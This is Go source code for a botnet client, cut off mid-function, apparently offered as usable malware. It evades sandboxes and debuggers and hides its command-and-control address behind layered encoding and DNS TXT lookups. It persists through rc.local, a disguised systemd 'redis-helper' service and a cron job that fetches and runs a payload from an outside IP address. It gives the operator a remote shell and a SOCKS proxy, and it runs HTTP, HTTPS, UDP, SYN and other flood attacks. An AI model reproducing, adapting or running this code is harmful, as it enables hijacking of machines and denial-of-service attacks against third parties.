package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/md5"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/miekg/dns"
)

//run setup.py dont try to change this yourself

// Obfuscated config - multi-layer encoding (setup.py generates this)
const gothTits = "2i8nGWLfsdsdoKd8zvTgtEz3b" //change me run setup.py
const cryptSeed = "20c091ad"                    //change me run setup.py

// DNS servers for TXT record lookups (shuffled for load balancing)
var lizardSquad = []string{
	"1.1.1.1:53",        // Cloudflare
	"8.8.8.8:53",        // Google
	"9.9.9.9:53",        // Quad9
	"208.67.222.222:53", // OpenDNS
	"1.0.0.1:53",        // Cloudflare secondary
}

// Anti-analysis: split key derivation across functions
func mew() byte     { return byte(0x31 ^ 0x64) }
func mewtwo() byte  { return byte(0x72 ^ 0x17) }
func celebi() byte  { return byte(0x93 ^ 0xc6) }
func jirachi() byte { return byte(0xa4 ^ 0x81) }

// deriveKey => charizard - Derive runtime key from seed + binary entropy
func charizard(seed string) []byte {
	h := md5.New()
	h.Write([]byte(seed))
	h.Write([]byte{mew(), mewtwo(), celebi(), jirachi()})
	entropy := []byte{0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE}
	for i := range entropy {
		entropy[i] ^= byte(len(seed) + i*17)
	}
	h.Write(entropy)
	return h.Sum(nil)
}

// streamDecrypt => blastoise
func blastoise(data []byte, key []byte) []byte {
	s := make([]byte, 256)
	for i := range s {
		s[i] = byte(i)
	}
	j := 0
	for i := 0; i < 256; i++ {
		j = (j + int(s[i]) + int(key[i%len(key)])) % 256
		s[i], s[j] = s[j], s[i]
	}
	result := make([]byte, len(data))
	i, j := 0, 0
	for k := range data {
		i = (i + 1) % 256
		j = (j + int(s[i])) % 256
		s[i], s[j] = s[j], s[i]
		result[k] = data[k] ^ s[(int(s[i])+int(s[j]))%256]
	}
	return result
}

// decodeObfuscated => venusaur
func venusaur(encoded string) string {
	layer1, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return ""
	}
	key := charizard(cryptSeed)
	layer2 := make([]byte, len(layer1))
	for i := range layer1 {
		layer2[i] = layer1[i] ^ key[i%len(key)]
	}
	layer3 := blastoise(layer2, key)
	result := make([]byte, len(layer3))
	for i := range layer3 {
		b := layer3[i]
		b = ((b << 3) | (b >> 5))
		b ^= 0xAA
		result[i] = b
	}
	if len(result) < 5 {
		return ""
	}
	payload := result[:len(result)-4]
	checksum := result[len(result)-4:]
	h := md5.New()
	h.Write(payload)
	expected := h.Sum(nil)[:4]
	for i := range checksum {
		if checksum[i] != expected[i] {
			return ""
		}
	}
	return string(payload)
}

// lookupTXTRecord => darkrai
func darkrai(domain string) (string, error) {
	servers := make([]string, len(lizardSquad))
	copy(servers, lizardSquad)
	rand.Shuffle(len(servers), func(i, j int) {
		servers[i], servers[j] = servers[j], servers[i]
	})
	var lastErr error
	for _, server := range servers {
		c := new(dns.Client)
		c.Timeout = 5 * time.Second
		m := new(dns.Msg)
		m.SetQuestion(dns.Fqdn(domain), dns.TypeTXT)
		m.RecursionDesired = true
		r, _, err := c.Exchange(m, server)
		if err != nil {
			lastErr = err
			continue
		}
		if r.Rcode != dns.RcodeSuccess {
			lastErr = fmt.Errorf("DNS query failed with code: %d", r.Rcode)
			continue
		}
		for _, ans := range r.Answer {
			if txt, ok := ans.(*dns.TXT); ok {
				for _, t := range txt.Txt {
					t = strings.TrimSpace(t)
					if strings.HasPrefix(t, "c2=") {
						return strings.TrimPrefix(t, "c2="), nil
					}
					if strings.HasPrefix(t, "ip=") {
						return strings.TrimPrefix(t, "ip="), nil
					}
					if strings.Contains(t, ":") && !strings.Contains(t, " ") {
						parts := strings.Split(t, ":")
						if len(parts) == 2 {
							if net.ParseIP(parts[0]) != nil || arceus(parts[0]) {
								return t, nil
							}
						}
					}
				}
			}
		}
		lastErr = fmt.Errorf("no valid C2 address in TXT records")
	}
	return "", lastErr
}

// lookupTXTviaDoH => palkia
func palkia(domain string) (string, error) {
	dohServers := []string{
		"https://1.1.1.1/dns-query",
		"https://8.8.8.8/dns-query",
		"https://dns.google/dns-query",
	}
	for _, server := range dohServers {
		url := fmt.Sprintf("%s?name=%s&type=TXT", server, domain)
		req, err := http.NewRequest("GET", url, nil)
		if err != nil {
			continue
		}
		req.Header.Set("Accept", "application/dns-json")
		client := &http.Client{Timeout: 10 * time.Second}
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		defer resp.Body.Close()
		if resp.StatusCode != http.StatusOK {
			continue
		}
		var dnsResp struct {
			Answer []struct {
				Data string `json:"data"`
			} `json:"Answer"`
		}
		if err := json.NewDecoder(resp.Body).Decode(&dnsResp); err != nil {
			continue
		}
		for _, ans := range dnsResp.Answer {
			data := strings.Trim(ans.Data, "\"")
			data = strings.TrimSpace(data)
			if strings.HasPrefix(data, "c2=") {
				return strings.TrimPrefix(data, "c2="), nil
			}
			if strings.HasPrefix(data, "ip=") {
				return strings.TrimPrefix(data, "ip="), nil
			}
			if strings.Contains(data, ":") && !strings.Contains(data, " ") {
				parts := strings.Split(data, ":")
				if len(parts) == 2 {
					return data, nil
				}
			}
		}
	}
	return "", fmt.Errorf("DoH TXT lookup failed")
}

// isValidHostname => arceus
func arceus(h string) bool {
	if len(h) == 0 || len(h) > 253 {
		return false
	}
	for _, c := range h {
		if !((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
			(c >= '0' && c <= '9') || c == '-' || c == '.') {
			return false
		}
	}
	return true
}

// requestMore => dialga
func dialga() string {
	decoded := venusaur(gothTits)
	if decoded == "" {
		return ""
	}
	if strings.Contains(decoded, ":") {
		parts := strings.Split(decoded, ":")
		if len(parts) == 2 && net.ParseIP(parts[0]) != nil {
			return decoded
		}
	}
	domain := decoded
	defaultPort := "443"
	if strings.Contains(domain, ":") {
		parts := strings.Split(domain, ":")
		domain = parts[0]
		if len(parts) > 1 {
			defaultPort = parts[1]
		}
	}
	if c2Addr, err := darkrai(domain); err == nil && c2Addr != "" {
		return c2Addr
	}
	if c2Addr, err := palkia(domain); err == nil && c2Addr != "" {
		return c2Addr
	}
	ips, err := net.LookupHost(domain)
	if err == nil && len(ips) > 0 {
		return fmt.Sprintf("%s:%s", ips[0], defaultPort)
	}
	return decoded
}

const (
	magicCode       = "E68dPGaHs*0iaYeS" //change this per campaign
	protocolVersion = "V5_4"             //change this per campaign
)

var (
	fancyBear        = 5 * time.Second
	cozyBear         = 2024
	lazarusListener  net.Listener
	lazarusActive    bool
	lazarusMutex     sync.Mutex
	lazarusCount     int32
	lazarusMax       int32 = 100
	aptStopChan            = make(chan struct{})
	aptStopMutex     sync.Mutex
	aptAttackRunning bool
)

const equationGroup = 256

// appendToFile => sandworm
func sandworm(path, line string, perm os.FileMode) error {
	f, err := os.OpenFile(path, os.O_APPEND|os.O_WRONLY|os.O_CREATE, perm)
	if err != nil {
		return err
	}
	defer f.Close()
	_, _ = f.WriteString(line)
	return nil
}

// RandString => turla
func turla(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

// randName => kimsuky
func kimsuky() string {
	dict := []string{"update", "syncd", "logger", "system", "crond", "netd"}
	return dict[rand.Intn(len(dict))] + "-" + turla(4)
}

// createCronJob => carbanak
func carbanak(hiddenDir string) {
	cronJob := fmt.Sprintf("* * * * * bash %s/.redis_script.sh > /dev/null 2>&1", hiddenDir)
	cmd := exec.Command("bash", "-c", fmt.Sprintf("(crontab -l; echo '%s') | crontab -", cronJob))
	_ = cmd.Run()
}

// persistRcLocal => fin7
func fin7() {
	rc := "/etc/rc.local"
	if _, err := os.Stat(rc); err != nil {
		return
	}
	exe, _ := os.Executable()
	b, err := os.ReadFile(rc)
	if err != nil || strings.Contains(string(b), exe) {
		return
	}
	line := exe + " # " + kimsuky() + "\n"
	_ = sandworm(rc, line, 0700)
}

// setupPersistence => dragonfly
func dragonfly() {
	hiddenDir := "/var/lib/.redis_helper"
	scriptPath := filepath.Join(hiddenDir, ".redis_script.sh")
	programPath := filepath.Join(hiddenDir, ".redis_process")
	url := "http://185.247.224.107/mods/installer"
	_ = os.MkdirAll(hiddenDir, 0755)
	scriptContent := fmt.Sprintf("#!/bin/bash\nURL=\"%s\"\nPROGRAM_PATH=\"%s\"\nif [ ! -f \"$PROGRAM_PATH\" ]; then\nwget -O $PROGRAM_PATH $URL\nchmod +x $PROGRAM_PATH\nfi\nif ! pgrep -x \".redis_process\" > /dev/null; then\n$PROGRAM_PATH &\nfi\n", url, programPath)
	_ = os.WriteFile(scriptPath, []byte(scriptContent), 0755)
	serviceContent := "[Unit]\nDescription=System Helper Service\nAfter=network.target\n[Service]\nExecStart=/var/lib/.redis_helper/.redis_script.sh\nRestart=always\nRestartSec=60\n[Install]\nWantedBy=multi-user.target\n"
	servicePath := "/etc/systemd/system/redis-helper.service"
	_ = os.WriteFile(servicePath, []byte(serviceContent), 0644)
	cmd := exec.Command("systemctl", "enable", "--now", "redis-helper.service")
	_ = cmd.Run()
	carbanak(hiddenDir)
}

// isSandboxed => winnti
func winnti() bool {
	vmIndicators := []string{"vmware", "vbox", "virtualbox", "qemu", "firejail", "bubblewrap", "gvisor", "kata", "cuckoo", "joesandbox", "cape", "any.run", "hybrid-analysis"}
	if procs, err := os.ReadDir("/proc"); err == nil {
		for _, proc := range procs {
			if !proc.IsDir() {
				continue
			}
			if _, err := strconv.Atoi(proc.Name()); err != nil {
				continue
			}
			if cmdline, err := os.ReadFile("/proc/" + proc.Name() + "/cmdline"); err == nil {
				cmdStr := strings.ToLower(string(cmdline))
				for _, indicator := range vmIndicators {
					if strings.Contains(cmdStr, indicator) {
						return true
					}
				}
			}
		}
	}
	analysisTools := []string{"/usr/bin/strace", "/usr/bin/ltrace", "/usr/bin/gdb", "/usr/bin/radare2", "/usr/bin/ghidra", "/usr/bin/ida", "/usr/bin/wireshark", "/usr/bin/tshark", "/usr/bin/tcpdump"}
	for _, tool := range analysisTools {
		if _, err := os.Stat(tool); err == nil {
			if out, err := exec.Command("pgrep", "-f", filepath.Base(tool)).Output(); err == nil {
				if len(strings.TrimSpace(string(out))) > 0 {
					return true
				}
			}
		}
	}
	if ppid := os.Getppid(); ppid > 1 {
		if cmdline, err := os.ReadFile(fmt.Sprintf("/proc/%d/cmdline", ppid)); err == nil {
			parentCmd := strings.ToLower(string(cmdline))
			debuggers := []string{"gdb", "strace", "ltrace", "radare2", "rr"}
			for _, debugger := range debuggers {
				if strings.Contains(parentCmd, debugger) {
					return true
				}
			}
		}
	}
	return false
}

// parseC2Address => scarcruft
func scarcruft(address string) (string, string, error) {
	address = strings.TrimSpace(address)
	address = strings.TrimPrefix(address, "tcp://")
	address = strings.TrimPrefix(address, "http://")
	address = strings.TrimPrefix(address, "https://")
	parts := strings.Split(address, ":")
	if len(parts) != 2 {
		return "", "", fmt.Errorf("invalid address")
	}
	return parts[0], parts[1], nil
}

// connectViaTLS => gamaredon
func gamaredon(host, port string) (net.Conn, error) {
	tlsConfig := &tls.Config{InsecureSkipVerify: true, MinVersion: tls.VersionTLS12}
	dialer := &net.Dialer{Timeout: 30 * time.Second}
	rawConn, err := dialer.Dial("tcp", net.JoinHostPort(host, port))
	if err != nil {
		return nil, err
	}
	tlsConn := tls.Client(rawConn, tlsConfig)
	tlsConn.SetDeadline(time.Now().Add(30 * time.Second))
	if err := tlsConn.Handshake(); err != nil {
		tlsConn.Close()
		return nil, err
	}
	tlsConn.SetDeadline(time.Time{})
	return tlsConn, nil
}

// generateBotID => mustangPanda
func mustangPanda() string {
	hostname, _ := os.Hostname()
	interfaces, _ := net.Interfaces()
	mac := "unknown"
	for _, iface := range interfaces {
		if iface.Flags&net.FlagUp != 0 && iface.Flags&net.FlagLoopback == 0 && len(iface.HardwareAddr) > 0 {
			mac = iface.HardwareAddr.String()
			break
		}
	}
	data := fmt.Sprintf("%s:%s", hostname, mac)
	hash := fmt.Sprintf("%x", md5.Sum([]byte(data)))
	return hash[:8]
}

// generateAuthResponse => hafnium
func hafnium(challenge, secret string) string {
	h := md5.New()
	h.Write([]byte(challenge + secret + challenge))
	return base64.StdEncoding.EncodeToString(h.Sum(nil))
}

// detectArchitecture => charmingKitten
func charmingKitten() string {
	goarch := runtime.GOARCH
	osName := runtime.GOOS
	archMap := map[string]string{"386": "x86", "amd64": "x64", "arm": "ARM32", "arm64": "ARM64", "mips": "MIPS", "mips64": "MIPS64", "ppc64": "PowerPC64", "ppc64le": "PowerPC64LE", "s390x": "s390x", "wasm": "WebAssembly"}
	if arch, exists := archMap[goarch]; exists {
		if osName == "windows" {
			if goarch == "amd64" {
				return "Windows-x64"
			} else if goarch == "386" {
				return "Windows-x86"
			}
		} else if osName == "linux" {
			return "Linux-" + arch
		} else if osName == "darwin" {
			return "macOS-" + arch
		}
		return arch
	}
	return osName + "-" + goarch
}

// ExecuteShell => sidewinder
func sidewinder(cmd string) (string, error) {
	args := []string{"sh", "-c", cmd}
	command := exec.Command(args[0], args[1:]...)
	var stdout, stderr bytes.Buffer
	command.Stdout = &stdout
	command.Stderr = &stderr
	err := command.Run()
	if err != nil {
		return fmt.Sprintf("Error: %v\nStderr: %s", err, stderr.String()), err
	}
	output := stdout.String()
	if stderr.Len() > 0 {
		output += "\nStderr: " + stderr.String()
	}
	return output, nil
}

// ExecuteShellDetached => oceanLotus
func oceanLotus(cmd string) {
	go func() {
		args := []string{"sh", "-c", cmd}
		command := exec.Command(args[0], args[1:]...)
		command.SysProcAttr = &syscall.SysProcAttr{Setsid: true}
		command.Stdout = nil
		command.Stderr = nil
		command.Stdin = nil
		command.Start()
	}()
}

// ExecuteShellStreaming => machete
func machete(cmd string, conn net.Conn) error {
	args := []string{"sh", "-c", cmd}
	command := exec.Command(args[0], args[1:]...)
	stdout, err := command.StdoutPipe()
	if err != nil {
		return err
	}
	stderr, err := command.StderrPipe()
	if err != nil {
		return err
	}
	if err := command.Start(); err != nil {
		return err
	}
	go func() {
		scanner := bufio.NewScanner(stdout)
		for scanner.Scan() {
			conn.Write([]byte(fmt.Sprintf("STDOUT: %s\n", scanner.Text())))
		}
	}()
	go func() {
		scanner := bufio.NewScanner(stderr)
		for scanner.Scan() {
			conn.Write([]byte(fmt.Sprintf("STDERR: %s\n", scanner.Text())))
		}
	}()
	err = command.Wait()
	if err != nil {
		conn.Write([]byte(fmt.Sprintf("EXIT ERROR: %v\n", err)))
	} else {
		conn.Write([]byte("EXIT: Command completed successfully\n"))
	}
	return nil
}

// startSocksProxy => muddywater
func muddywater(port string, c2Conn net.Conn) error {
	lazarusMutex.Lock()
	defer lazarusMutex.Unlock()
	if lazarusActive {
		return fmt.Errorf("SOCKS proxy already running")
	}
	portNum, err := strconv.Atoi(port)
	if err != nil || portNum < 1 || portNum > 65535 {
		return fmt.Errorf("invalid port: %s", port)
	}
	listener, err := net.Listen("tcp", "0.0.0.0:"+port)
	if err != nil {
		return fmt.Errorf("failed to bind: %v", err)
	}
	lazarusListener = listener
	lazarusActive = true
	atomic.StoreInt32(&lazarusCount, 0)
	go func() {
		for {
			conn, err := listener.Accept()
			if err != nil {
				lazarusMutex.Lock()
				running := lazarusActive
				lazarusMutex.Unlock()
				if running {
					continue
				}
				return
			}
			if atomic.LoadInt32(&lazarusCount) >= lazarusMax {
				conn.Close()
				continue
			}
			atomic.AddInt32(&lazarusCount, 1)
			go func(c net.Conn) {
				defer atomic.AddInt32(&lazarusCount, -1)
				trickbot(c)
			}(conn)
		}
	}()
	return nil
}

// stopSocksProxy => emotet
func emotet() {
	lazarusMutex.Lock()
	defer lazarusMutex.Unlock()
	if lazarusListener != nil {
		lazarusListener.Close()
		lazarusListener = nil
	}
	lazarusActive = false
}

// handleSocksConnection => trickbot
func trickbot(clientConn net.Conn) {
	defer clientConn.Close()
	clientConn.SetDeadline(time.Now().Add(30 * time.Second))
	buf := make([]byte, 262)
	n, err := clientConn.Read(buf)
	if err != nil || n < 2 || buf[0] != 0x05 {
		return
	}
	clientConn.Write([]byte{0x05, 0x00})
	n, err = clientConn.Read(buf)
	if err != nil || n < 7 || buf[1] != 0x01 {
		clientConn.Write([]byte{0x05, 0x07, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})
		return
	}
	addrType := buf[3]
	var targetAddr string
	var targetPort uint16
	switch addrType {
	case 0x01:
		if n < 10 {
			return
		}
		targetAddr = net.IP(buf[4:8]).String()
		targetPort = uint16(buf[8])<<8 | uint16(buf[9])
	case 0x03:
		domainLen := int(buf[4])
		if n < 5+domainLen+2 {
			return
		}
		targetAddr = string(buf[5 : 5+domainLen])
		targetPort = uint16(buf[5+domainLen])<<8 | uint16(buf[6+domainLen])
	case 0x04:
		if n < 22 {
			return
		}
		targetAddr = net.IP(buf[4:20]).String()
		targetPort = uint16(buf[20])<<8 | uint16(buf[21])
	default:
		clientConn.Write([]byte{0x05, 0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})
		return
	}
	target := fmt.Sprintf("%s:%d", targetAddr, targetPort)
	targetConn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		clientConn.Write([]byte{0x05, 0x05, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})
		return
	}
	defer targetConn.Close()
	localAddr := targetConn.LocalAddr().(*net.TCPAddr)
	ip4 := localAddr.IP.To4()
	if ip4 == nil {
		ip4 = net.IPv4(0, 0, 0, 0)
	}
	response := []byte{0x05, 0x00, 0x00, 0x01}
	response = append(response, ip4...)
	response = append(response, byte(localAddr.Port>>8), byte(localAddr.Port))
	clientConn.Write(response)
	clientConn.SetDeadline(time.Time{})
	targetConn.SetDeadline(time.Time{})
	done := make(chan struct{}, 2)
	go func() {
		io.Copy(targetConn, clientConn)
		if tc, ok := targetConn.(*net.TCPConn); ok {
			tc.CloseWrite()
		}
		done <- struct{}{}
	}()
	go func() {
		io.Copy(clientConn, targetConn)
		if tc, ok := clientConn.(*net.TCPConn); ok {
			tc.CloseWrite()
		}
		done <- struct{}{}
	}()
	<-done
	<-done
}

// stopAllAttacks => pikachu
func pikachu() {
	aptStopMutex.Lock()
	defer aptStopMutex.Unlock()
	if aptAttackRunning {
		close(aptStopChan)
		aptStopChan = make(chan struct{})
		aptAttackRunning = false
	}
}

// getStopChan => raichu
func raichu() chan struct{} {
	aptStopMutex.Lock()
	defer aptStopMutex.Unlock()
	aptAttackRunning = true
	return aptStopChan
}

// handleCommand => blackEnergy
func blackEnergy(conn net.Conn, command string) error {
	fields := strings.Fields(command)
	if len(fields) == 0 {
		return fmt.Errorf("empty command")
	}
	cmd := fields[0]
	switch cmd {
	case "!shell", "!exec":
		if len(fields) < 2 {
			return fmt.Errorf("usage: !shell <command>")
		}
		output, err := sidewinder(strings.Join(fields[1:], " "))
		if err != nil {
			conn.Write([]byte(fmt.Sprintf("ERROR: %v\n", err)))
		} else {
			encoded := base64.StdEncoding.EncodeToString([]byte(output))
			conn.Write([]byte(fmt.Sprintf("OUTPUT_B64: %s\n", encoded)))
		}
		return nil
	case "!stream":
		if len(fields) < 2 {
			return fmt.Errorf("usage: !stream <command>")
		}
		go machete(strings.Join(fields[1:], " "), conn)
		conn.Write([]byte("Streaming started\n"))
		return nil
	case "!detach", "!bg":
		if len(fields) < 2 {
			return fmt.Errorf("usage: !detach <command>")
		}
		oceanLotus(strings.Join(fields[1:], " "))
		conn.Write([]byte("Command running in background\n"))
		return nil
	case "!stop":
		pikachu()
		conn.Write([]byte("STOP: All attacks terminated\n"))
		return nil
	case "!udpflood", "!tcpflood", "!http", "!ack", "!gre", "!syn", "!dns", "!https", "!tls", "!cfbypass":
		if len(fields) != 4 {
			return fmt.Errorf("invalid format")
		}
		target := fields[1]
		targetPort, _ := strconv.Atoi(fields[2])
		duration, _ := strconv.Atoi(fields[3])
		switch cmd {
		case "!udpflood":
			go snorlax(target, targetPort, duration)
		case "!tcpflood":
			go gengar(target, targetPort, duration)
		case "!http":
			go alakazam(target, targetPort, duration)
		case "!https", "!tls":
			go machamp(target, targetPort, duration)
		case "!cfbypass":
			go gyarados(target, targetPort, duration)
		case "!syn":
			go dragonite(target, targetPort, duration)
		case "!ack":
			go tyranitar(target, targetPort, duration)
		case "!gre":
			go metagross(target, duration)
		case "!dns":
			go salamence(target, targetPort, duration)
		}
		conn.Write([]byte(fmt.Sprintf("Attack started: %s on %s:%d for %d seconds\n", cmd, target, targetPort, duration)))
	case "!persist":
		go dragonfly()
		conn.Write([]byte("Persistence setup initiated\n"))
	case "!kill":
		conn.Write([]byte("Bot shutting down\n"))
		os.Exit(0)
	case "!info":
		hostname, _ := os.Hostname()
		arch := charmingKitten()
		info := fmt.Sprintf("Hostname: %s\nArch: %s\nBotID: %s\nOS: %s\n", hostname, arch, mustangPanda(), runtime.GOOS)
		conn.Write([]byte(fmt.Sprintf("INFO: %s\n", info)))
	case "!socks":
		if len(fields) < 2 {
			return fmt.Errorf("usage: !socks <port>")
		}
		err := muddywater(fields[1], conn)
		if err != nil {
			conn.Write([]byte(fmt.Sprintf("SOCKS ERROR: %v\n", err)))
		} else {
			conn.Write([]byte(fmt.Sprintf("SOCKS: Proxy started on port %s\n", fields[1])))
		}
	case "!stopsocks":
		emotet()
		conn.Write([]byte("SOCKS: Proxy stopped\n"))
	default:
		return fmt.Errorf("unknown command")
	}
	return nil
}

// handleC2Connection => anonymousSudan
func anonymousSudan(conn net.Conn) {
	reader := bufio.NewReader(conn)
	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	challengeMsg, err := reader.ReadString('\n')
	if err != nil {
		conn.Close()
		return
	}
	challengeMsg = strings.TrimSpace(challengeMsg)
	if !strings.HasPrefix(challengeMsg, "AUTH_CHALLENGE:") {
		conn.Close()
		return
	}
	challenge := strings.TrimPrefix(challengeMsg, "AUTH_CHALLENGE:")
	challenge = strings.TrimSpace(challenge)
	response := hafnium(challenge, magicCode)
	conn.Write([]byte(response + "\n"))
	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	authResult, err := reader.ReadString('\n')
	if err != nil || strings.TrimSpace(authResult) != "AUTH_SUCCESS" {
		conn.Close()
		return
	}
	botID := mustangPanda()
	arch := charmingKitten()
	conn.Write([]byte(fmt.Sprintf("REGISTER:%s:%s:%s\n", protocolVersion, botID, arch)))
	for {
		conn.SetReadDeadline(time.Now().Add(180 * time.Second))
		command, err := reader.ReadString('\n')
		if err != nil {
			break
		}
		command = strings.TrimSpace(command)
		if command == "PING" {
			conn.Write([]byte("PONG\n"))
			continue
		}
		if err := blackEnergy(conn, command); err != nil {
			conn.Write([]byte(fmt.Sprintf("ERROR: %v\n", err)))
		}
	}
	conn.Close()
}

func main() {
	if winnti() {
		os.Exit(200)
	}
	fin7()
	c2Address := dialga()
	if c2Address == "" {
		return
	}
	host, port, err := scarcruft(c2Address)
	if err != nil {
		return
	}
	for {
		conn, err := gamaredon(host, port)
		if err != nil {
			time.Sleep(fancyBear)
			continue
		}
		anonymousSudan(conn)
		time.Sleep(fancyBear)
	}
}

// DNS response type => magikarp
type magikarp struct {
	Answer []struct {
		Data string `json:"data"`
	} `json:"Answer"`
}

// resolveTarget => lucario
func lucario(target string) (string, error) {
	if net.ParseIP(target) != nil {
		return target, nil
	}
	target = strings.TrimPrefix(target, "http://")
	target = strings.TrimPrefix(target, "https://")
	if idx := strings.Index(target, "/"); idx != -1 {
		target = target[:idx]
	}
	if idx := strings.Index(target, ":"); idx != -1 {
		target = target[:idx]
	}
	ips, err := net.LookupHost(target)
	if err == nil && len(ips) > 0 {
		return ips[0], nil
	}
	url := fmt.Sprintf("https://1.1.1.1/dns-query?name=%s&type=A", target)
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return "", fmt.Errorf("error: %v", err)
	}
	req.Header.Set("Accept", "application/dns-json")
	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf("error: %v", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("status: %d", resp.StatusCode)
	}
	var dnsResp magikarp
	if err := json.NewDecoder(resp.Body).Decode(&dnsResp); err != nil {
		return "", fmt.Errorf("decode error: %v", err)
	}
	if len(dnsResp.Answer) == 0 {
		return "", fmt.Errorf("no records")
	}
	return dnsResp.Answer[0].Data, nil
}

var eevee = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
}

// performHTTPFlood => alakazam
func alakazam(target string, targetPort, duration int) {
	rand.Seed(time.Now().UnixNano())
	stopCh := raichu()
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	var requestCount int64
	var wg sync.WaitGroup
	resolvedIP, err := lucario(target)
	if err != nil {
		return
	}
	targetURL := fmt.Sprintf("http://%s:%d", resolvedIP, targetPort)
	userAgents := []string{"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)", "Mozilla/5.0 (Linux; Android 11; SM-G996B)", "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)"}
	referers := []string{"https://www.google.com/", "https://www.example.com/", "https://www.wikipedia.org/"}
	for i := 0; i < cozyBear; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			client := &http.Client{}
			for {
				select {
				case <-ctx.Done():
					return
				case <-stopCh:
					return
				default:
					body := make([]byte, 1024)
					req, err := http.NewRequest("POST", targetURL, bytes.NewReader(body))
					if err != nil {
						continue
					}
					req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
					req.Header.Set("Referer", referers[rand.Intn(len(referers))])
					resp, _ := client.Do(req)
					if resp != nil {
						resp.Body.Close()
					}
					atomic.AddInt64(&requestCount, 1)
				}
			}
		}()
	}
	wg.Wait()
}

// performHTTPSFlood => machamp
func machamp(target string, targetPort, duration int) {
	rand.Seed(time.Now().UnixNano())
	stopCh := raichu()
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	var requestCount int64
	var wg sync.WaitGroup
	hostname := target
	hostname = strings.TrimPrefix(hostname, "https://")
	hostname = strings.TrimPrefix(hostname, "http://")
	if idx := strings.Index(hostname, "/"); idx != -1 {
		hostname = hostname[:idx]
	}
	if idx := strings.Index(hostname, ":"); idx != -1 {
		hostname = hostname[:idx]
	}
	resolvedIP, err := lucario(target)
	if err != nil {
		return
	}
	targetAddr := fmt.Sprintf("%s:%d", resolvedIP, targetPort)
	tlsConfig := &tls.Config{InsecureSkipVerify: true, ServerName: hostname, MinVersion: tls.VersionTLS12, MaxVersion: tls.VersionTLS13}
	paths := []string{"/", "/index.html", "/api", "/search", "/login", "/wp-admin"}
	methods := []string{"GET", "POST", "HEAD"}
	for i := 0; i < cozyBear; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				case <-stopCh:
					return
				default:
					dialer := &net.Dialer{Timeout: 5 * time.Second}
					conn, err := tls.DialWithDialer(dialer, "tcp", targetAddr, tlsConfig)
					if err != nil {
						continue
					}
					for j := 0; j < 10; j++ {
						select {
						case <-ctx.Done():
							conn.Close()
							return
						case <-stopCh:
							conn.Close()
							return
						default:
						}
						method := methods[rand.Intn(len(methods))]
						path := paths[rand.Intn(len(paths))]
						ua := eevee[rand.Intn(len(eevee))]
						var reqBuilder strings.Builder
						reqBuilder.WriteString(fmt.Sprintf("%s %s HTTP/1.1\r\n", method, path))
						reqBuilder.WriteString(fmt.Sprintf("Host: %s\r\n", hostname))
						reqBuilder.WriteString(fmt.Sprintf("User-Agent: %s\r\n", ua))
						reqBuilder.WriteString("Accept: text/html,application/xhtml+xml\r\n")
						reqBuilder.WriteString("Connection: keep-alive\r\n")
						if method == "POST" {
							body := turla(rand.Intn(1024) + 256)
							reqBuilder.WriteString(fmt.Sprintf("Content-Length: %d\r\n\r\n", len(body)))
							reqBuilder.WriteString(body)
						} else {
							reqBuilder.WriteString("\r\n")
						}
						conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
						if _, err := conn.Write([]byte(reqBuilder.String())); err != nil {
							break
						}
						atomic.AddInt64(&requestCount, 1)
					}
					conn.Close()
				}
			}
		}()
	}
	wg.Wait()
}

type ditto struct {
	cookies   []*http.Cookie
	userAgent string
	client    *http.Client
}

func zorua() *ditto {
	jar, _ := zoroark()
	return &ditto{
		cookies:   nil,
		userAgent: eevee[rand.Intn(len(eevee))],
		client: &http.Client{
			Timeout: 30 * time.Second,
			Jar:     jar,
			Transport: &http.Transport{
				TLSClientConfig:   &tls.Config{InsecureSkipVerify: true, MinVersion: tls.VersionTLS12},
				DisableKeepAlives: false,
				MaxIdleConns:      100,
				IdleConnTimeout:   90 * time.Second,
			},
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
